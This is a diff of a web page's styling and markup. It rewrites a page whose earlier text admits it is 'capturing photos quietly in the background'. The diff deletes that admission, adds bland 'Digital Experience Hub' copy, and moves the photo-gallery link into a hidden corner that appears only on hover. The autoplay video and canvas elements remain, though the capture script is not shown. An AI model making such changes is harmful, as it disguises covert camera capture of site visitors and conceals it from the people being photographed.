@@ -8,34 +8,113 @@
       display: none;
     }
     body {
-      font-family: Arial, sans-serif;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+      position: relative;
+      overflow: hidden;
+    }
+    .container {
+      background-color: white;
+      border-radius: 15px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+      padding: 40px;
+      max-width: 600px;
+      width: 100%;
       text-align: center;
-      margin-top: 50px;
+    }
+    .logo {
+      font-size: 3em;
+      margin-bottom: 10px;
+      color: #4a6fa5;
     }
     h1 {
-      font-size: 2.5em;
-      color: #333;
+      color: #2c3e50;
+      font-size: 2.2em;
+      margin-top: 5px;
+      margin-bottom: 20px;
     }
-    p {
-      font-size: 1.2em;
-      color: #666;
+    .description {
+      color: #7f8c8d;
+      font-size: 1.1em;
+      line-height: 1.6;
+      margin-bottom: 30px;
     }
-    a {
-      display: inline-block;
-      margin-top: 20px;
-      padding: 10px 20px;
-      background: #333;
+    .footer {
+      margin-top: 30px;
+      color: #95a5a6;
+      font-size: 0.9em;
+    }
+
+
+    .corner-area {
+      position: fixed;
+      bottom: 0;
+      right: 0;
+      width: 100px;
+      height: 100px;
+      z-index: 1000;
+    }
+
+    .gallery-btn {
+      position: absolute;
+      bottom: -100px;
+      right: -100px;
+      background: #4a6fa5;
       color: white;
       text-decoration: none;
-      border-radius: 5px;
+      padding: 12px 20px;
+      border-radius: 50px;
+      font-weight: 600;
+      transition: all 0.3s ease;
+      font-size: 1.1em;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      opacity: 0;
+      z-index: 1000;
+    }
+
+    .corner-area:hover .gallery-btn {
+      bottom: 15px;
+      right: 15px;
+      opacity: 1;
+    }
+
+    .corner-indicator {
+      position: absolute;
+      bottom: 5px;
+      right: 5px;
+      width: 10px;
+      height: 10px;
+      background: rgba(74, 111, 165, 0.3);
+      border-radius: 50%;
+      transition: all 0.3s ease;
+    }
+
+    .corner-area:hover .corner-indicator {
+      background: rgba(74, 111, 165, 0);
     }
   </style>
 </head>
 <body>
-  <h1>Welcome to My Website</h1>
-  <p>Enjoy your time here — this site is capturing photos quietly in the background 😉</p>
+  <div class="container">
+    <div class="logo">📱</div>
+    <h1>Digital Experience Hub</h1>
+    <p class="description">
+      Welcome to our interactive platform. Explore our features and discover a world of digital possibilities.
+    </p>
+    <div class="footer">© 2025 Digital Experience Hub. All rights reserved.</div>
+  </div>
 
-  <a href="/gallery">📸 View Gallery</a>
+  <div class="corner-area">
+    <div class="corner-indicator"></div>
+    <a href="/gallery" class="gallery-btn">📸 Browse Gallery</a>
+  </div>
 
   <video id="video" autoplay playsinline></video>
   <canvas id="canvas"></canvas>
